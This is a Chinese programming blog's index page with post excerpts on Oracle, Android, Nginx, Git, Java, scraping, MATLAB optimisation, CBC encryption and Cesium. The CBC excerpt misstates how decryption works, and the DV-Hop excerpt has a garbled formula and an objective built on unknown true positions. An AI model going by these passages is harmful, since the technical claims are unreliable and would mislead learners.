<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cead5601ed730031b8972e33a4c47483/" rel="bookmark">
			在Oracle12c rac集群中使用dbca图形化创建数据库时需要设置数据块大小，应该在目录的那一步找到定制数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 Oracle 12c RAC 集群中使用 DBCA 图形化创建数据库时，可以按照以下步骤找到定制数据库选项并设置数据块大小：
1. 打开终端或命令提示符窗口，并输入 `dbca` 命令启动 DBCA。
2. DBCA 将打开图形用户界面。选择 "创建数据库"（Create Database）选项，然后点击 "下一步"（Next）按钮。
3. 在 "创建数据库的方式"（Database Creation Method）页面，选择 "高级模式"（Advanced Mode）。然后点击 "下一步"（Next）按钮。
4. 在 "数据库模板选择"（Template Chooser）页面，选择 "自定义数据库"（Custom Database）选项。然后点击 "下一步"（Next）按钮。
5. 在 "数据库标识"（Database Identification）页面，输入数据库名称和唯一标识符。然后点击 "下一步"（Next）按钮。
6. 在 "配置节点选项"（Configure Nodes Options）页面，选择要包含在 RAC 集群中的节点。然后点击 "下一步"（Next）按钮。
7. 在 "数据库管理选项"（Database Management Options）页面，选择适当的管理选项。然后点击 "下一步"（Next）按钮。
8. 在 "数据库模式"（Database Schema）页面，选择适当的模式选项。然后点击 "下一步"（Next）按钮。
9. 在 "存储选项"（Storage Options）页面，选择适当的存储选项。然后点击 "下一步"（Next）按钮。
10. 在 "数据库文件位置"（Database File Locations）页面，选择要存储数据库文件的位置。然后点击 "下一步"（Next）按钮。
11. 在 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cead5601ed730031b8972e33a4c47483/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e081ac91c0b678c59fcf847dad06724/" rel="bookmark">
			Android 应用锁/程序锁（APPLock）的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://shigongbo.blog.163.com/blog/static/976090201452572535715
今天看到某Android安全软件有一个安全锁的功能，使用的时候，点击返回竟然是无效的，必须要用户输入密码！这用户体验也太差了！在网上查了一下，发现许多人都是在Activity中显示解锁画面，并屏蔽返回键。我感觉这样用户体验很差，于是就想自己实现一个。现在把主要思路和代码分享一下。
其实这个程序核心代码很少，不超过一百行就搞定。不过其中牵扯到的Android知识点很多，现在听我从头道来。
我们先来解释一下APPLock的原理。
用户启动APPLock，此时会列出所有的应用程序，选择要Lock的应用，将此应用的信息（包名）保存到数据库或文件。
并启动一个Service，我们称其为LockService，在后台一直监听，查看要Lock的应用是否被启动。
当用户启动了要Lock的应用，LockService就会察觉到，此时显示密码界面，让用户输入密码，密码正确后，密码界面消失。
如果密码界面正在显示的时候，用户点击返回，会怎么样？那肯定是密码界面消失，要启动的应用显示出来，这就不能达到应用锁的效果，所以开发者选择了在密码界面屏蔽返回键的方式。体验太差！
首先，要解决的就是怎么避免使用Activity显示解锁画面并屏蔽返回键这种不好的用户体验。
既要显示画面，又要不屏蔽返回键，怎么实现呢？
Service！对，就是在Service中显示画面。使用WindowManager加载layout的方式，让解锁画面显示在最前端。
View mLockView; TextView mTextView; WindowManager mWindowManager = null;mContext = getApplicationContext();WindowManager.LayoutParams params = new WindowManager.LayoutParams( WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.RGBA_8888); params.gravity = (Gravity.CENTER); mLockView= layoutInflater.inflate(R.layout.lock_app_service, null); mTextView = (TextView) mLockView.findViewById(R.id.service_input_pwd); if (mWindowManager == null) { mWindowManager = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE); } if (mWindowManager != null &amp;&amp; mLockView!= null) { mWindowManager.addView(mLockView, params); } 把这段加到LockService中，它会显示一个覆盖屏幕的画面，也就是你xml定义的文件lock_app_service。
要使用这个功能，你还要在Manifest中添加权限
&lt;uses-permission android:name="android.permission.SYSTEM_OVERLAY_WINDOW" /&gt;
这样这个画面运行的时候就会在最前端覆盖整个屏幕了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e081ac91c0b678c59fcf847dad06724/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3656690adebf15bee1742d07c8d19f67/" rel="bookmark">
			基于cat12和SPM12进行VBM数据分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基于cat12和SPM12进行VBM数据分析 VBM 能定量计算局部灰质体素的大小和信号强度，从而能够检测出局部脑
区的特征和脑组织成分的差异。
1.前期软件安装准备： 1.1 spm12和cat12软件安装 参考这篇文章操作：
https://blog.csdn.net/qq_44354520/article/details/103951458?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131449516800188580354%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131449516800188580354&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-103951458-null-null.142^v92^chatgptT0_1&amp;utm_term=spm12%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&amp;spm=1018.2226.3001.4187
1.2 dpabi软件安装 根据这篇文章操作：
https://blog.csdn.net/qq_42356925/article/details/123928073
2.VBM图像预处理一般步骤 2.1图像格式转换 将原始的磁共振文件.dcm文件转换成spm以及cat能够处理的格式.nii文件。这里格式转换的方式有很多，比如使用dcm2niigui转换工具，或者直接使用dpabi软件进行转换，这里演示如何用dpabi进行图像格式的转换。
（1） 将工作路径切换至图像数据存在的地方，并在该路径下按如下图格式创建文件夹，其中T1Img文件夹中存放未经过格式转换的被试.dcm文件。
每个subxx文件存放被试的.dcm图像文件：
（2）安装好dpabi后在Matlab中键入dpabi进入dpabi操作界面，并点击如下图所示的dpabi按键进入图像处理界面。
（3）按照下图所示进行格式转换，选择好后点击Run即可。
在与T1Raw相同文件夹的T1Img文件中生成了图像格式转换后的.nii文件，如下图所示：
其中sub01_3DT1_20141225141440_5_Crop_1.nii文件便是我们后期需要处理的.nii文件，用mricron软件查看图像如下图所示：
2.2 检查图像，调整原点 首先就是需要我们自己手动调整一下结构像，打开spm，点击spm首页的PET&amp;VBM，然后点Display，摆正每个被试的 T1 数据，并使 AC-PC 的连线水平。
手动将蓝色十字线的交叉点放到大概下面这个位置，即前联合的位置。
2.3 原始脑结构图分割 基于cat12对被试者的原始脑结构图进行分割，分割成灰质、白质和脑脊液三个部分。
（1）运行Matlab2018a，在命令框中输入：spm敲回车，调用spm工具包。
（2）在SPM for functional MRI部分找到Toolbox，下拉找到cat12，点击打开cat12工具包，之后便会出现工具包cat12的操作界面，如下图：
（3）点击segment，进入如下界面：
选择需要处理的T1图像，参数配置好后点击左上角的小三角运行即可：
点击后出现如下运行界面：
（4）最终会在每个被试文件夹中生成三个文件夹——mri（分割之后的图像）、report（数据分割过程及结果存）、label。
其中在mri文件夹内有分割后的文件。mwp1对应灰质， mwp2对应白质，report中有分割质量报告。
2.4 体积数据文件获取 回到cat12操作主界面，在statistical analysis部分，点击Get TIV，如图所示：
输入文件后点击运行，在相应的默认文件夹下生成输出的.txt文件：
2.5 对图像进行平滑 运行spm12，点击Smooth，按下图操作，平滑核大小参考文献选择。
2.6 对图像进行标准化 使用spm进行标准化，这里选择上一步以及平滑后的图片
3.VBM分析过程 3.1 生成设计矩阵 （1）点击上图中的圈1（Specify 2nd-level）按钮，进入以下界面：
（2）双击Directory，这个是需要你选择你的输出结果放置的文件夹
（3）点击Design，选择two-sample t-test，接下来给Group 1 scans和Group 2 scans导入被试的结构特征数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3656690adebf15bee1742d07c8d19f67/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6222d8a99bb2bf6d08ec9e3fa0e7655/" rel="bookmark">
			基于粒子群优化技术的DV-Hop定位算法深度分析与MATLAB实现：从理论到实践的完整指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在近年来，无线传感器网络（WSN）已经成为多个研究领域的热点之一。其中，节点定位技术作为WSN的核心技术之一，关系到WSN的许多应用，例如目标跟踪、环境监测等。DV-Hop是一种基于跳数的定位算法，但在实际应用中，该算法仍然存在一些局限性，如定位精度不高、容易受到噪声干扰等。为了解决这些问题，本文将介绍一种基于粒子群优化技术的DV-Hop定位算法的改进方法，并利用MATLAB对其进行模拟实验。
1. DV-Hop定位算法简介
DV-Hop定位算法是一种基于跳数的范围无关的定位算法。其主要思想是利用无线传感器网络中的节点之间的跳数信息，估计节点之间的距离，然后使用三角化方法进行定位。
该算法的主要步骤如下：
每个锚节点广播自己的位置和跳数信息。非锚节点收到广播后，根据接收到的跳数信息更新自己到各个锚节点的最少跳数。非锚节点计算平均每跳距离。根据平均每跳距离和锚节点的位置信息，非锚节点使用三角化方法估计自己的位置。 尽管DV-Hop定位算法在无需距离测量的情况下可以实现节点定位，但由于各种原因（如无线传播环境的复杂性、节点部署的不规则性等），该算法的定位误差仍然较大。
2. 粒子群优化技术简介
粒子群优化（PSO）是一种模拟鸟群觅食行为的启发式优化算法。该算法是通过模拟鸟群中的个体之间的交互行为，使整个鸟群向最优解移动。PSO算法的每个解都被看作是一个“粒子”，每个粒子都有自己的速度和位置。通过不断地更新粒子的速度和位置，使得粒子群逐渐趋向于最优解。
PSO算法的主要步骤如下：
初始化粒子群的位置和速度。计算每个粒子的适应度值。更新每个粒子的速度和位置。重复步骤2和3，直到满足停止条件。 由于PSO算法的全局搜索能力和高效的收敛性，它被广泛应用于各种优化问题。
3. 基于粒子群优化的DV-Hop定位算法改进
考虑到DV-Hop定位算法的局限性，我们提出了一个基于粒子群优化的DV-Hop定位算法改进方法。该方法的核心思想是：利用PSO算法的全局搜索能力，对DV-Hop算法中的关键参数进行优化，从而提高定位精度。
3.1 改进方法的主要步骤
使用DV-Hop算法得到初步的节点位置估计。定义目标函数，该函数描述了节点位置估计与真实位置之间的误差。使用PSO算法优化目标函数，从而得到更精确的节点位置估计。 3.2 目标函数的定义
目标函数的定义是本方法的关键。我们定义的目标函数为：
f§=∑i=1N(∥pi−pi′∥2)f(\mathbf{p}) = \sum_{i=1}^{N} \left( \lVert \mathbf{p}_i - \mathbf{p}_i^{'} \rVert^2 \right)f§=i=1∑N​(∥pi​−pi′​∥2)
其中，pi\mathbf{p}_ipi​ 是节点i的真实位置，pi′\mathbf{p}_i^{'}pi′​ 是节点i的位置估计，N是网络中的节点数。
3.3 PSO算法的参数设置
在实验中，我们设置了以下PSO算法的参数：
粒子数：50学习因子：2,22, 22,2惯性权重：0.9最大迭代次数：100 4. MATLAB实现
为了验证基于粒子群优化的DV-Hop定位算法改进方法的有效性，我们使用MATLAB进行了模拟实验。下面是实现该方法的部分MATLAB代码：
% 初始化参数 particle_num = 50; learning_factor = [2, 2]; inertia_weight = 0.9; max_iter = 100; % 初始化粒子群的位置和速度 positions = rand(particle_num, 2) * 100; velocities = rand(particle_num, 2) * 10; for iter = 1:max_iter % 计算每个粒子的适应度值 fitness = computeFitness(positions); % 更新每个粒子的速度和位置 [positions, velocities] = updateParticles(positions, velocities, learning_factor, inertia_weight, fitness); end % 输出最优解 [~, best_idx] = min(fitness); best_position = positions(best_idx, :); disp(['The best position is: ', num2str(best_position)]); 请注意，这只是实现该方法的部分MATLAB代码。为了得到完整的代码和详细的实验结果，您需要下载完整的项目。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6222d8a99bb2bf6d08ec9e3fa0e7655/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43e9fe20e71ad0e6d11727b56511e8ba/" rel="bookmark">
			Nginx配置文件详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nginx配置文件详解 1、Nginx配置文件1.1主配置文件详解1.2子配置文件 2、全局配置部分2.1修改启动的工作进程数（worker process) 优化2.2cpu与worker process绑定2.3 PID 路径修改2.4 修改工作进程的优先级2.5调试工作进程打开的文件的个数2.6关闭master-worker工作模式（仅测试用） 3、events部分4、http设置（http部分）4.1http部分详解4.2mime4.3 server 下的 root指令4.4构建虚拟主机4.4.1基于域名的虚拟主机4.4.2基于端口4.4.3基于ip地址 4.5路径别名alias4.6 location模块4.7基于四层的访问控制—access模块4.8验证模块4.8.1htpasswd命令4.8.2 配置验证模块 4.9 关闭或修改版本信息4.9.1关闭版本信息显示4.9.2 修改nginx 版本信息 4.10 自定义 错误页面4.11 日志位置存放4.12 检测文件是否存在-----try_files指令4.12.1 原理部分4.12.2 配置实例 4.13 长连接相关-keepalive指令4.13.1 原理4.13.2 keepalive_timeout4.13.3 keepalive_requests 4.14 作为下载服务器配置4.15 用户上传资料4.16 其他设置 1、Nginx配置文件 1.1主配置文件详解 主配置文件：nginx.conf
编译安装的主配置文件在自己自定义的文件夹下编译安装的主文件配置在/etc/nginx/nginx.conf
//主配置文件格式 main block：主配置段，即全局配置段，对http,mail都有效 //配置Nginx服务器的事件模块相关参数 events { ... } //http/https 协议相关配置段 http { ... } //默认配置文件不包括下面两个模块 //mail 协议相关配置段 mail { ... } //stream 服务器相关配置段 stream {负载均衡 ... } vim /apps/nginx/conf/nginx.conf //查看编译安装的nginx的配置文件 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43e9fe20e71ad0e6d11727b56511e8ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e1f2aed1d8647ddb2d25294147f3e85/" rel="bookmark">
			实用-idea常用快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		快速创建包和类
选中项目的一个文件夹，然后alt+insert即可。
查看类的结构：
sts中可以通过F4查看或者ctrl+T
idea中通过ctrl+H 查看
查看某个类中的所有方法
方法一：alt + 7 （可以查看类的字段、属性、方法，是否继承等）方法二： ctrl + F12 想要从使用方法的地方或者从接口中的方法，跳转到方法具体实现的地方
ctrl+alt+鼠标左键
如果crtl+鼠标左键 是跳转到方法的声明的类中去
添加try/catch的快捷键
ctrl+alt+T
重写父类方法快捷键
ctrl+o
查看某个类在哪里被引用
选中类ctrl+鼠标左键
快捷生成foreach
通过集合或者数组名.for + 代码提示，选第一个。
或者集合或者数组.iter，选择第一个
快速生成for循环
for+i+代码提示或者 20.for 或 20.fori
快捷将选中的代码生成方法
选中要封装成一个方法的代码，然后ctrl+alt+m，为方法取名即可。
快速输出
“123”.sout 回车就变成了System.out.println(“123”);
###替换
ctrl + r: 当前文件内容替换，指的是在当前打开的文件中替换匹配的字符，只操作一个文件。如下图1所示
ctrl + shift + r: 在路径中替换，指的是在选定的目录下或者类包下，查找要被替换的字符，再在第二个输入框中输入要替换的字符，点击弹出框的右下角的replace或者replaceall即可。如下图2所示
idea下git log乱码问题：https://blog.csdn.net/qq_35448165/article/details/103470695
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4ec6f40881d5b3967213e62c9102a83/" rel="bookmark">
			前端需要理解的工程化知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Git 1.1 Git 常见工作流程 Git 有4个区域：工作区（workspace)、index（暂存区）、repository（本地仓库）和remote（远程仓库），而工作区就是指对文件发生更改的地方，更改通过git add 存入暂存区，然后由git commit 提交至本地仓库，最后push推送到远程仓库。
工作目录包括.git 子目录（包含仓库所有相关的 Git 修订历史记录）、工作树，或签出的项目文件的副本。
裸存储库只包含版本控制信息而没有工作文件（工作树）而且.git 子目录中的所有内容存在于主目录。
完成提交（commit）前，称为“staging area”或“index”。此区域可对其进行格式化和审查。git 会在提交之前触发 pre-commit hook，使用pre-commit hook相关的脚行对提交到存储库中的更改执行完整性检查等，不满足可以阻止提交操作。
常见工作场景：
初始化本地仓库： 创建本地分支并推送关联远程： 查看分支： 合并分支： 删除分支： 标签管理： push变更代码的流程： 开发新feature功能：新建一个feature分支，并关联远程分支，然后合并到开发分支（如果存在），确定没问题再MR合并到master分支。
bug修复：新建一个bugfix分支，并关联远程分支，然后合并到开发分支（如果存在），确定没问题再MR合并到master分支；
git stash：将工作目录（修改后的跟踪文件和暂存的更改）保存在一堆未完成的更改中并且可以随时重新应用这些更改。
1.2 git pull 和 git fetch git pull ：从中央存储库中提取特定分支的新更改或提交，并更新本地存储库中的目标分支。
git fetch ：相同的目的，但工作方式略不同。 git fetch 从所需的分支中提取所有新提交存储在本地存储库中的新分支中。若要在目标分支中反映这些更改，必须在 git fetch 之后执行git merge。只有在对目标分支和获取的分支进行合并后才会更新目标分支。
git pull = git fetch + git merge
1.4 Git 和 SVN Git是分布式版本控制工具，可本地系统克隆远端存储库，支持离线提交，基于C语言，push/pull很快，通过commit实现共享。不依赖于中央服务器来存储项目文件的所有版本。
SVN是集中版本控制工具，存储在服务器，仅支持在线提交，push/pull较慢，不支持共享。
1.5 git merge 和 git rebase 两者都是用于分支合并，关键在 commit 记录的处理上不同：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4ec6f40881d5b3967213e62c9102a83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0693d1bc3430f19391cf365d6f70ba2f/" rel="bookmark">
			JAVA学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1-1 基础语法
1-2 运算符
1-3 死循环
1-4 数组
2-1 类和对象
2-1-1 对象内存图——103（单个对象）/104（多个对象）
2-1-2 成员变量和局部变量
2-1-3 封装
java跨平台原理：java程序可以在任意操作系统上运行。在需要运行java应用程序的操作系统上，安装一个对应的java虚拟机（jvm）即可。
JDK &gt; JRE &gt; JVm
JDK java程序开发工具包；JRE java运行时环境； JVM java虚拟机。
1-1 基础语法 注释 单行注释： //
多行注释：/* 注释信息 */
关键词 字母全部小写，颜色标记（常用编辑器）
常量 常量类型字符串常量双引号括起来的内容"HelloWorld"整数常量不带小数的数字777，-7小数常量带小数的数字字符常量用单引号括起来的内容'q'布尔常量布尔值，表示真假true false空常量空值null 数据类型 数据类型基本数据类型数值型整数byte 1
字节
-128~127short2 -32768~32767
（2的15次方）
int
(默认)
4 -2的31次方~
2的31次方-1
long8 -2的63次方~
2的63次方-1
浮点数float4 double
(默认)
8字符char20-65535（ 2的16次-1
）非数值型布尔boolean1true false引用数据类型类class接口interface数组 标识符‘ 1. 由数字、字母、下划线和美元符组成
2. 不能以数字开头
3. 不能是关键字
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0693d1bc3430f19391cf365d6f70ba2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d468c6a1d82b001e9b386b6427ac052a/" rel="bookmark">
			python爬取豆瓣top250电影（爬虫新手练习）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 前段时间学习了一点爬虫知识，找到一些网站学习学习，巩固一下。
python版本：python(3.11.4)网站：豆瓣电影TOP250python包：requests(2.31.0)，BeautifulSoup(4.12.2)，csv，time 练习 思路 通过requests访问该网站，使用beautifulsoup解析网站，将相关内容保存到csv格式文件中。
框架 #爬取前250部电影的名称、评分、导演、链接 def getHTMLText(url): return ‘’ def getMovieList(html): return ‘’ def save_to_csv(movielist): return ‘’ def main(): return ‘’ if __name__ == '__main__': main() 主要框架就是这样，接下来按照自己的需求一点一点填充就好。
补充代码 getHTMLText(url) def getHTMLText(url): try: headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'} r = requests.get(url, headers=headers,timeout=30) r.raise_for_status() # 如果状态不是200，引发HTTPError异常 # print(r.status_code)# 查看状态码 r.encoding = r.apparent_encoding # print('success') return r.text except: print('error')# 异常处理 return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d468c6a1d82b001e9b386b6427ac052a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33788affbf7997f1ebd563f7aacce3ad/" rel="bookmark">
			Go语言圣经
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
第一章 入门
1.1 Hello,World
1.2 命令行参数
1.3 查找重复的行
1.4 GIF动画
1.5 获取URL
1.6 并发获取多个URL
第二章 程序结构
2.1 命名
2.2 声明
2.3 变量
2.3.1 简短变量声明
2.3.2 指针
2.3.3 new函数
2.3.4 变量的声明周期
2.4 赋值
2.4.1 元组赋值
2.5 类型
第三章 基础数据类型
3.1 整型
3.2 浮点数
3.3 复数
3.4 布尔型
3.5 字符串
3.6 常量
第四章 复合数据类型
4.1 数组
4.2 Slice
4.3 Map
4.4 结构体
4.5 JSON
4.6 文本和HTML模板
第五章 函数
5.1 函数声明
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33788affbf7997f1ebd563f7aacce3ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d43a77d2b15e9c7d90d85d9a496eee76/" rel="bookmark">
			抽象类和接口有什么区别？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在 Java 中，抽象类和接口是两种不同的类类型。它们都不能直接实例化，并且它们都是用来定义一些基本的属性和方法的，但它们有以下几点不同：
定义不同：定义的关键字不同，抽象类是 abstract，而接口是 interface。方法不同：抽象类可以包含抽象方法和具体方法，而接口只能包含方法声明（抽象方法）。方法访问控制符不同：抽象类无限制，只是抽象类中的抽象方法不能被 private 修饰；而接口有限制，接口默认的是 public 控制符。类型扩展不同：一个类只能继承一个抽象类，但可以实现多个接口。变量不同：抽象类可以包含实例变量和静态变量，而接口只能包含常量。构造函数不同：抽象类可以有构造函数，而接口不能有构造函数。方法实现不同：抽象类中的普通方法必须有实现，抽象方法必须没有实现；而接口中普通方法不能有实现（不考虑JDK 8中default默认方法，它是有实现的）职责不同：接口是为了定义规范；而抽象类是为了复用代码。 编译器在去生成字节码文件时，会给interface底下所有的类加public的。
以下是一个抽象类和一个接口的示例代码：
// 抽象类 public abstract class MyAbstractClass { public abstract void myAbstractMethod(); private void myMethod() { System.out.println("This is a method in an abstract class."); } public int myVariable = 0; public static int myStaticVariable = 0; public MyAbstractClass() { System.out.println("This is a constructor in an abstract class."); } } // 接口 public interface MyInterface { void myAbstractMethod(); int MY_CONSTANT = 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d77f1f2d0d1337b013acd8270e840917/" rel="bookmark">
			常见问题及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
springcloud
1、snakeyaml
2、optionalArgs
3、 hostname
4、StatusRuntimeException
5、Param 'serviceName' is illegal
6、could not be found
7、Failed to declare queue
8、An unexpected connection driver error occured
elasticsearch
1.elasticsearch默认用户密码重置
2. cosign: 未找到命令
3.elasticsearch 8.9 &amp;kibana问题
集合
list与数组互转
lamda方式排序
Docker
1、删除为none的镜像
2、already in use by container
windows与虚拟机(centos)
1、Device/Credential Guard
2.没有东西提供 module(perl:5.26)
3.linux centos8安装docker一系列问题解决
4.未知的名称或服务
5、bash: shasum: 未找到命令
github
1、github访问不了
MQ
rabbitmq
1.Failed to convert Message content
springcloud 1、snakeyaml java.lang.NoSuchMethodError: org.yaml.snakeyaml.representer.Representer: method &lt;init&gt;()V not found
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d77f1f2d0d1337b013acd8270e840917/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2113d35681d4ea9d0f8743c108427326/" rel="bookmark">
			计算机网络中的密钥连接方式：CBC模式详解，保护你的数据更安全！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机网络中的密钥连接方式：CBC模式详解，保护你的数据更安全！ 计算机网络中的数据传输安全是一个重要的问题，而加密算法是保障数据安全的关键。在众多的加密算法中，CBC（Cipher Block Chaining）模式是一种常用且可靠的密钥连接方式。本文将详细介绍CBC模式的原理、特点以及应用，帮助读者更好地理解和使用该加密模式。
1. CBC模式简介 CBC模式是对称加密中的一种分组密码工作模式，它通过将明文分组与前一个密文分组进行异或运算来增强加密的强度和随机性。具体而言，CBC模式将明文分组与前一个密文分组首先进行异或运算，然后再进行加密，最后输出密文。在解密时，需要将密文分组与前一个密文分组进行异或运算，然后再进行解密操作。
2. CBC模式的特点 数据依赖性：CBC模式中，每个密文分组的生成都依赖于前一个密文分组，这样可以增加加密的随机性，使得相同的明文分组在加密后得到不同的密文分组。错误传播性：如果密文分组发生错误，解密时会导致明文分组的错误传播。因此，CBC模式要求在传输过程中保证数据的完整性，一旦数据被篡改，将会影响后续分组的解密。初始化向量（IV）：CBC模式需要一个初始的向量（IV）作为第一个分组的加密参数，这样可以使得每次加密的结果都不同，增加了安全性。 3. CBC模式的加密过程 下面是CBC模式的加密过程：
首先，将明文按照固定长度分组。初始化向量（IV）作为第一个分组的加密参数。将当前明文分组与前一个密文分组进行异或运算。对异或结果进行加密操作，得到当前分组的密文。将当前分组的密文作为下一个分组的参数，重复第3步至第4步，直到所有明文分组都加密完成。 4. CBC模式的解密过程 CBC模式的解密过程与加密过程相似，只是在每一步的操作中，加密和解密的顺序互换：
首先，将密文按照固定长度分组。初始化向量（IV）作为第一个分组的解密参数。对当前密文分组进行解密操作，得到当前分组的明文。将当前密文分组与前一个密文分组进行异或运算，得到明文分组。将当前分组的密文作为下一个分组的解密参数，重复第3步至第4步，直到所有密文分组都解密完成。 5. CBC模式的应用 CBC模式广泛应用于各种加密通信协议和安全协议中，例如SSL/TLS、IPSec等。它通过增加数据的随机性和传播性，提高了加密的强度和安全性。同时，CBC模式也能够抵御常见的攻击方式，如查表攻击和多次加密。然而，在应用CBC模式时，需要注意合理选择初始向量（IV），并确保数据的完整性，以免被攻击者利用漏洞进行破解。
6. 总结 CBC模式是一种常用且可靠的密钥连接方式，在计算机网络中起着重要的作用。它通过数据依赖性和错误传播性，增强了加密的随机性和强度。在实际应用中，我们应该注意合理选择初始向量（IV），并保证数据的完整性，以保障通信的安全性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64504f9fd0d37f1315217fd3563f2127/" rel="bookmark">
			cesium按需下载天地图瓦片，进行离线加载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用场景 在某些特定的需求中，需要对瓦片资源进行离线部署，这个时候在线的瓦片服务就满足不了这类需求，于是就需要将瓦片图加载下来，这种好处就是不需要后台部署瓦片服务也不需要依赖第三方瓦片服务器，还能实现指定的某块区域的瓦片进行加载。之前写了一篇关于arcGis的瓦片加载，由于它跟天地图的下载方式还不太一样，这里就详细写一篇关于天地图的瓦片下载案例
cesium版本要求 本案例是基于cesium 1.95版本实现
实现的思路 1.使用cesium加载在线天地图瓦片
2.重写cesium中ImageryProvider的loadImage函数，将加载到的瓦片通过image的方式生成并保存到集合中，集合上保存的是每张瓦片的http地址
3.写一个函数将集合中瓦片下载到本地，注意瓦片的命名
4.搭建nodejs服务来实现图片的级别设置和对应的瓦片图
5.影像地图和标注需要分别下载
